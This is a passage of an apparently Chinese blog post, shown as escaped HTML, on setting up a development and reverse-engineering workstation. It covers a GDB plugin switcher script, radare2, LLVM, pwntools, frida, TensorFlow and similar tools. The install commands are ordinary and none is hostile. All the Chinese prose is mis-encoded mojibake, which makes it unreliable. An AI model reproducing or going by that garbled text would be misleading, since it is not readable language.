&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">number&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">sign&lt;/span>&lt;span class="p">%&lt;/span>&lt;span class="nv">$pattern&lt;/span>&lt;span class="si">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">location&lt;/span>&lt;span class="o">=&lt;/span>$&lt;span class="o">[&lt;/span>number+2&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">parameter_add&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">location&lt;/span>&lt;span class="si">}&lt;/span>i
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">parameter_del&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">location&lt;/span>&lt;span class="si">}&lt;/span>d
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">message&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;TEST&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nv">$name&lt;/span> -eq &lt;span class="s2">&amp;#34;1&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> sed -i &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$parameter_del&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="nv">$gdbinitfile&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> sed -i &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$parameter_add&lt;/span>&lt;span class="s2"> &lt;/span>&lt;span class="nv">$peda&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="nv">$gdbinitfile&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">echo&lt;/span> -e &lt;span class="s2">&amp;#34;Please enjoy the peda!\n&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nv">$name&lt;/span> -eq &lt;span class="s2">&amp;#34;2&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> sed -i &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$parameter_del&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="nv">$gdbinitfile&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> sed -i &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$parameter_add&lt;/span>&lt;span class="s2"> &lt;/span>&lt;span class="nv">$gef&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="nv">$gdbinitfile&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">echo&lt;/span> -e &lt;span class="s2">&amp;#34;Please enjoy the gef!\n&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> sed -i &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$parameter_del&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="nv">$gdbinitfile&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> sed -i &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$parameter_add&lt;/span>&lt;span class="s2"> &lt;/span>&lt;span class="nv">$pwndbg&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="nv">$gdbinitfile&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">echo&lt;/span> -e &lt;span class="s2">&amp;#34;Please enjoy the pwndbg!\n&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">fi&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> -e &lt;span class="s2">&amp;#34;Please choose one mode of GDB?\n1.peda 2.gef 3.pwndbg&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">read&lt;/span> -p &lt;span class="s2">&amp;#34;Input your choice:&amp;#34;&lt;/span> num
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nv">$num&lt;/span> -eq &lt;span class="s2">&amp;#34;1&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Mode_change &lt;span class="nv">$num&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">elif&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nv">$num&lt;/span> -eq &lt;span class="s2">&amp;#34;2&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Mode_change &lt;span class="nv">$num&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">elif&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nv">$num&lt;/span> -eq &lt;span class="s2">&amp;#34;3&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Mode_change &lt;span class="nv">$num&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">else&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">echo&lt;/span> -e &lt;span class="s2">&amp;#34;Error!\nPleasse input right number!&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">fi&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">gdb &lt;span class="nv">$1&lt;/span> &lt;span class="nv">$2&lt;/span> &lt;span class="nv">$3&lt;/span> &lt;span class="nv">$4&lt;/span> &lt;span class="nv">$5&lt;/span> &lt;span class="nv">$6&lt;/span> &lt;span class="nv">$7&lt;/span> &lt;span class="nv">$8&lt;/span> &lt;span class="nv">$9&lt;/span>&lt;span class="c1">#&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>r2å…¨å®¶æ¡¶ ï¼ˆé€†å‘è°ƒè¯•ç¥å™¨ï¼‰&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">git clone https://github.com/radare/radare2.git
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> radare2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sys/install.sh#Install / Update
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>gcc arm aarch aarch64&lt;/p>
&lt;p>&lt;code>sudo apt install gcc-arm-linux-gnueabi&lt;/code>Â ä½¿ç”¨å‘½ä»¤&lt;code>arm-linux-gnueabi-gcc&lt;/code>&lt;/p>
&lt;p>&lt;code>sudo apt install gcc-aarch64-linux-gnu&lt;/code>Â ä½¿ç”¨å‘½ä»¤&lt;code>aarch64-linux-gnu-gcc&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>clang+llvm&lt;/p>
&lt;ul>
&lt;li>
&lt;p>æ–¹æ³•ä¸€ï¼Œæ‰‹åŠ¨ç¼–è¯‘å®‰è£…ï¼Œè´¹æ—¶è´¹åŠ›&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æ–¹æ³•äºŒ apt&lt;/p>
&lt;p>å®Œæ•´æ–¹æ³•è¿™ä¸ª&lt;a class="link" href="http://apt.llvm.org/" target="_blank" rel="noopener"
>åœ°å€&lt;/a>&lt;/p>
&lt;p>åªå†™ubuntu 18,04&lt;/p>
&lt;ol>
&lt;li>ç¼–è¾‘ /etc/apt/sources.listï¼Œæ·»åŠ æº&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># i386 not available&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">deb http://apt.llvm.org/bionic/ llvm-toolchain-bionic main
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">deb-src http://apt.llvm.org/bionic/ llvm-toolchain-bionic main
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 7&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">deb http://apt.llvm.org/bionic/ llvm-toolchain-bionic-7 main
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">deb-src http://apt.llvm.org/bionic/ llvm-toolchain-bionic-7 main
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 8&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">deb http://apt.llvm.org/bionic/ llvm-toolchain-bionic-8 main
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">deb-src http://apt.llvm.org/bionic/ llvm-toolchain-bionic-8 main
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol>
&lt;li>æ·»åŠ è¯ä¹¦&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">wget -O - https://apt.llvm.org/llvm-snapshot.gpg.key&lt;span class="p">|&lt;/span>sudo apt-key add -
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Fingerprint: 6084 F3CF 814B 57C1 CF12 EFD5 15CF 4D18 AF4F 7421&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol>
&lt;li>å®‰è£… ç‰ˆæœ¬8&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># LLVM&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">apt-get install libllvm-8-ocaml-dev libllvm8 llvm-8 llvm-8-dev llvm-8-doc llvm-8-examples llvm-8-runtime
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Clang and co&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">apt-get install clang-8 clang-tools-8 clang-8-doc libclang-common-8-dev libclang-8-dev libclang1-8 clang-format-8 python-clang-8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># libfuzzer&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">apt-get install libfuzzer-8-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># lldb&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">apt-get install lldb-8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># lld (linker)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">apt-get install lld-8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># libc++&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">apt-get install libc++-8-dev libc++abi-8-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># OpenMP&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">apt-get install libomp-8-dev
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>python3+pip&lt;/p>
&lt;p>&lt;code>apt install python3 python3-pipã€python-pip&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>pythonåº“&lt;/p>
&lt;ul>
&lt;li>
&lt;p>frida ï¼ˆhook) åŒwinä¸‹ä½¿ç”¨&lt;/p>
&lt;/li>
&lt;li>
&lt;p>pwntools (py2)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>gmpy2 (py2-3)&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>r2Frida&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Brida&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="vscode-666">&lt;strong>vscode ï¼ˆ666ï¼‰&lt;/strong>&lt;/h3>
&lt;blockquote>
&lt;p>ä¸»è¦æ˜¯å„ç§æ’ä»¶&lt;/p>
&lt;/blockquote>
&lt;ul>
&lt;li>
&lt;p>zh-ch ï¼ˆæ±‰åŒ–åŒ…ï¼‰&lt;/p>
&lt;/li>
&lt;li>
&lt;p>background ï¼ˆå³ä¸‹è§’å°èŒäººï¼‰&lt;/p>
&lt;/li>
&lt;li>&lt;/li>
&lt;/ul>
&lt;h3 id="cmderhttpscmdernetwinä¸‹å¼ºå¤§çš„ç»ˆç«¯å·¥å…·">&lt;strong>&lt;a class="link" href="https://cmder.net/" target="_blank" rel="noopener"
>cmder&lt;/a>&lt;/strong>**Â (Winä¸‹å¼ºå¤§çš„ç»ˆç«¯å·¥å…·)**&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;a class="link" href="https://cmder.net/" target="_blank" rel="noopener"
>å®˜ç½‘&lt;/a>ä¸‹è½½å®‰è£…&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç®€å•é…ç½®ï¼š&lt;/p>
&lt;/li>
&lt;li>
&lt;p>wsl vim æ— æ³•ä½¿ç”¨ä¸Šä¸‹å·¦å³é”®è§£å†³&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="py2-py3">&lt;strong>py2-py3&lt;/strong>&lt;/h3>
&lt;p>&lt;a class="link" href="https://www.python.org/" target="_blank" rel="noopener"
>å®˜ç½‘&lt;/a>æ‰¾æƒ³è¦çš„åŒ…ä¸‹è½½ï¼ŒåŒæ—¶è£…ä¸¤ä¸ªç‰ˆæœ¬ã€‚&lt;/p>
&lt;p>ä¿®æ”¹ç¯å¢ƒå˜é‡ï¼Œæ—¥å¸¸ä½¿ç”¨py3,æŠŠpy3çš„ç¯å¢ƒå˜é‡æ”¾åœ¨å‰é¢ï¼Œå»py2çš„å®‰è£…ç›®å½•å¤åˆ¶ä¸€ä»½python.exe æ›´åä¸ºpython2.exeï¼Œå°±å¯ä»¥ä½¿ç”¨python2ä½œä¸ºå‘½ä»¤è¾“å…¥ã€‚&lt;/p>
&lt;p>pipé…ç½®ä¸ºå›½å†…æºä¼šå¿«å¾ˆå¤š&lt;/p>
&lt;h3 id="java8jdkæœ€æ–°">&lt;strong>Java8+jdkæœ€æ–°&lt;/strong>&lt;/h3>
&lt;p>&lt;a class="link" href="https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="noopener"
>å®˜ç½‘ä¸‹è½½å®‰è£…&lt;/a>&lt;/p>
&lt;p>ä¸‹ä¸ªjdkæœ€æ–°ç‰ˆé˜²æ­¢éƒ¨åˆ†å·¥å…·éœ€è¦ã€‚&lt;/p>
&lt;p>å¯èƒ½æœ‰æ—¶å€™è¿˜éœ€è¦é…ç½®ç¯å¢ƒå˜é‡JAVA_HOMEä¸ºJDKè·¯å¾„ã€‚&lt;/p>
&lt;h3 id="golang">&lt;strong>Golang&lt;/strong>&lt;/h3>
&lt;p>ä¹Ÿæ˜¯åªéœ€&lt;a class="link" href="https://golang.google.cn/" target="_blank" rel="noopener"
>ä¸‹è½½&lt;/a>å®‰è£…å°±ok.&lt;/p>
&lt;h3 id="nodejs">&lt;strong>NodeJS&lt;/strong>&lt;/h3>
&lt;p>ä¹Ÿæ˜¯åªéœ€&lt;a class="link" href="https://nodejs.org/en/" target="_blank" rel="noopener"
>ä¸‹è½½å®‰è£…&lt;/a>å°±ok. æ¨èç¨³å®šç‰ˆã€‚&lt;/p>
&lt;p>ä¼šé»˜è®¤å®‰è£…npmï¼Œç„¶è€Œä¸‹è½½é€Ÿåº¦å®åœ¨å¤ªæ…¢ï¼Œä½¿ç”¨æ·˜å®é•œåƒ&lt;a class="link" href="https://npm.taobao.org/" target="_blank" rel="noopener"
>cnpm&lt;/a>Â ,ç”¨æ³•ç›¸åŒ&lt;/p>
&lt;p>&lt;code>npm install -g cnpm --registry=https://registry.npm.taobao.org&lt;/code>&lt;/p>
&lt;h3 id="git">&lt;strong>git&lt;/strong>&lt;/h3>
&lt;p>&lt;a class="link" href="https://git-scm.com/" target="_blank" rel="noopener"
>å®˜ç½‘&lt;/a>ä¸‹è½½å®‰è£…å®Œäº‹&lt;/p>
&lt;h3 id="yarn">&lt;strong>Yarn&lt;/strong>&lt;/h3>
&lt;p>&lt;a class="link" href="https://www.yarnpkg.com/zh-Hant/" target="_blank" rel="noopener"
>å®˜ç½‘&lt;/a>ä¸‹è½½å®‰è£…å®Œäº‹&lt;/p>
&lt;h3 id="cmake">&lt;strong>CMake&lt;/strong>&lt;/h3>
&lt;p>&lt;a class="link" href="https://cmake.org/download/" target="_blank" rel="noopener"
>ä¸‹è½½&lt;/a>å®‰è£…ok&lt;/p>
&lt;h3 id="hugo-åšå®¢å·¥å…·">&lt;strong>hugo (åšå®¢å·¥å…·)&lt;/strong>&lt;/h3>
&lt;p>&lt;a class="link" href="https://github.com/gohugoio/hugo" target="_blank" rel="noopener"
>ä¸‹è½½exe&lt;/a>åˆ°æœ¬åœ°ï¼Œé…ç½®ç¯å¢ƒå˜é‡&lt;/p>
&lt;h3 id="haskell-stack">&lt;strong>Haskell Stack&lt;/strong>&lt;/h3>
&lt;p>&lt;a class="link" href="https://docs.haskellstack.org/en/stable/README/#how-to-install" target="_blank" rel="noopener"
>å®˜æ–¹æ–‡æ¡£&lt;/a>ã€winç›´æ¥ä¸‹è½½å®‰è£…&lt;/p>
&lt;h3 id="startlsback-winä¸‹çš„ç¾åŒ–å·¥å…·">&lt;strong>StartlsBack (winä¸‹çš„ç¾åŒ–å·¥å…·)&lt;/strong>&lt;/h3>
&lt;p>&lt;a class="link" href="http://www.cnbigger.com/330.html" target="_blank" rel="noopener"
>ä¸‹è½½å®‰è£…&lt;/a>Â é…ç½®åº•éƒ¨é€æ˜å’Œå±…ä¸­&lt;/p>
&lt;h3 id="notepad-è½»ä¾¿çš„ç¼–è¾‘å™¨">&lt;strong>Notepad++ (è½»ä¾¿çš„ç¼–è¾‘å™¨)&lt;/strong>&lt;/h3>
&lt;p>&lt;a class="link" href="https://notepad-plus-plus.org/" target="_blank" rel="noopener"
>ä¸‹è½½å®‰è£…&lt;/a>&lt;/p>
&lt;h3 id="android-sdk-é…ç½®">&lt;strong>Android SDK é…ç½®&lt;/strong>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>adbå·¥å…· åœ¨ç›®å½•&lt;code>platform-tools&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>emulatorã€monitor åœ¨&lt;code>tools&lt;/code>ä¸‹&lt;/p>
&lt;/li>
&lt;li>
&lt;p>NDK-build åœ¨&lt;code>ndk-bundle&lt;/code>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="flutter-google-è·¨å¹³å°æ¡†æ¶">&lt;strong>flutter (Google è·¨å¹³å°æ¡†æ¶)&lt;/strong>&lt;/h3>
&lt;p>æœ‰&lt;a class="link" href="https://flutter.dev/" target="_blank" rel="noopener"
>å®˜ç½‘&lt;/a>äº†&lt;/p>
&lt;p>ä¸‹è½½&lt;a class="link" href="https://flutter.dev/docs/development/tools/sdk/releases#windows" target="_blank" rel="noopener"
>SDK&lt;/a>-&amp;gt;é…ç½®ç¯å¢ƒå˜é‡&lt;code>Â flutter\bin&lt;/code>Â ã€‚æ·»åŠ åä¸ºâ€PUB_HOSTED_URLâ€å’Œâ€FLUTTER_STORAGE_BASE_URLâ€çš„æ¡ç›®ã€‚&lt;/p>
&lt;ul>
&lt;li>
&lt;p>Andorid Studioè®¾ç½®&lt;/p>
&lt;p>å®‰è£…æ’ä»¶&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>Flutter&lt;/code>æ’ä»¶ï¼š æ”¯æŒFlutterå¼€å‘å·¥ä½œæµ (è¿è¡Œã€è°ƒè¯•ã€çƒ­é‡è½½ç­‰).&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>Dart&lt;/code>æ’ä»¶ï¼š æä¾›ä»£ç åˆ†æ (è¾“å…¥ä»£ç æ—¶è¿›è¡ŒéªŒè¯ã€ä»£ç è¡¥å…¨ç­‰).&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>VScodeè®¾ç½®&lt;/p>
&lt;p>å®‰è£…æ’ä»¶&lt;/p>
&lt;ul>
&lt;li>&lt;code>flutter&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="genymotioné€é¥android-android-æ¨¡æ‹Ÿå™¨">&lt;strong>Genymotion+é€é¥Android (Android æ¨¡æ‹Ÿå™¨)&lt;/strong>&lt;/h3>
&lt;p>ä¸‹è½½å®‰è£…ok&lt;/p>
&lt;h3 id="cuda-nå¡xxx">&lt;strong>CUDA ï¼ˆNå¡xxx)&lt;/strong>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>æ ¹æ®è‡ªå·±çš„æ˜¾å¡å®˜ç½‘&lt;a class="link" href="https://developer.nvidia.com/cuda-downloads" target="_blank" rel="noopener"
>ä¸‹è½½åŒ…&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æ ¹æ®éœ€æ±‚å®‰è£…ã€‚&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>æœ‰ä¸ªå‘ï¼Œå¦‚æœä¸ºpytorch æˆ–TensorFlowåšå‰æ å…ˆçœ‹çœ‹è¿™ä¸¤æ”¯æŒçš„ç‰ˆæœ¬å†å®‰è£…ç›¸åº”çš„ç‰ˆæœ¬ã€‚&lt;/p>
&lt;h3 id="pytorch">&lt;strong>pytorch&lt;/strong>&lt;/h3>
&lt;ul>
&lt;li>éœ€æ±‚å‰ç½®ç¯å¢ƒä¹Ÿå¾—è£…å¥½&lt;/li>
&lt;/ul>
&lt;p>&lt;a class="link" href="https://pytorch.org/get-started/locally/" target="_blank" rel="noopener"
>å®˜æ–¹&lt;/a>æœ‰å¾ˆæ–¹ä¾¿çš„å®‰è£…æ–¹æ³• æ ¹æ®ä¸åŒå¹³å°å’Œç¯å¢ƒ&lt;/p>
&lt;h3 id="tensorflowhttpwwwbaiducomlinkurlaofeaqzsb4aqhwkb6uuy47eeb5qmtcf0_8xfizfoj8isah2g4usrjsxcv1lxp2nx">&lt;strong>&lt;a class="link" href="http://www.baidu.com/link?url=AOFeAQZSb4aqHWKb6uUy47eeb5qMTcf0_8xfIZfoJ8iSah2g4UsrjsXcv1lXP2NX" target="_blank" rel="noopener"
>TensorFlow&lt;/a>&lt;/strong>&lt;/h3>
&lt;ul>
&lt;li>å‰ç½®ç¯å¢ƒæŸ¥å®˜ç½‘&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># GPUç‰ˆæœ¬ py3&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pip3 install tensorflow-gpu# stable
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pip3 install tf-nightly-gpu# preview
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pip3 install tensorflow-gpu&lt;span class="o">==&lt;/span>2.0.0-alpha0##TensorFlow 2.0 Alpha# CPU ç‰ˆæœ¬
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pip3 install --user --upgrade tensorflow
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>tensorflow&lt;/code>Â - ä»…æ”¯æŒ CPU çš„æœ€æ–°ç¨³å®šç‰ˆï¼ˆå»ºè®®æ–°æ‰‹ä½¿ç”¨ï¼‰&lt;/p>
&lt;p>&lt;code>tensorflow-gpu&lt;/code>Â -Â &lt;a class="link" href="https://tensorflow.google.cn/install/gpu" target="_blank" rel="noopener"
>æ”¯æŒ GPU&lt;/a>Â çš„æœ€æ–°ç¨³å®šç‰ˆï¼ˆé€‚ç”¨äº Ubuntu å’Œ Windowsï¼‰&lt;/p>
&lt;p>&lt;code>tf-nightly&lt;/code>Â - ä»…æ”¯æŒ CPU çš„é¢„è§ˆæ¯å¤œç‰ˆï¼ˆä¸ç¨³å®šï¼‰&lt;/p>
&lt;p>&lt;code>tf-nightly-gpu&lt;/code>Â -Â &lt;a class="link" href="https://tensorflow.google.cn/install/gpu" target="_blank" rel="noopener"
>æ”¯æŒ GPU&lt;/a>Â çš„é¢„è§ˆæ¯å¤œç‰ˆï¼ˆä¸ç¨³å®šï¼Œé€‚ç”¨äº Ubuntu å’Œ Windowsï¼‰&lt;/p>
